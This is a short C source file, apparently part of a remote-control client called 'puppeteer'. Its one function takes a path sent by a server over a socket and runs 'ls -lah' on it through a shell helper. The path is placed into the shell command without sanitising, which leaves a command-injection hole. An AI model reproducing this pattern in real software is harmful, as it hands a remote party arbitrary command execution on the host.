// MIT License
/*
 * This header file belongs to https://github.com/arthur-bryan/puppeteer
 *
 * List files (hidden too) in a path and its properties
 *
 * Copyright (c) 2021 Arthur Bryan <arthurbryan2030@gmail.com>
 */
#include "../include/list_files.h"

#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "../include/sockets.h"
#include "../include/commands.h"


/*
 * Lists all the files and its properties on the path specified by the server
 *
 * Parameters:
 *      int16_t socket_fd: the socket file descriptor
 */
char
*list_files(int16_t socket_fd) {
    char    command[COMMAND_BUFFER_SIZE] = { 0 };
    char    *path = calloc(COMMAND_BUFFER_SIZE, sizeof(char));

    recv(socket_fd, path, COMMAND_BUFFER_SIZE - 1, 0);
    path[COMMAND_BUFFER_SIZE-1] = '\0';
    snprintf(command, COMMAND_BUFFER_SIZE, "ls -lah %s 2>/dev/null",  path);
    char    *command_output = execute_cmd(command);
    free(path);
    return command_output;
}
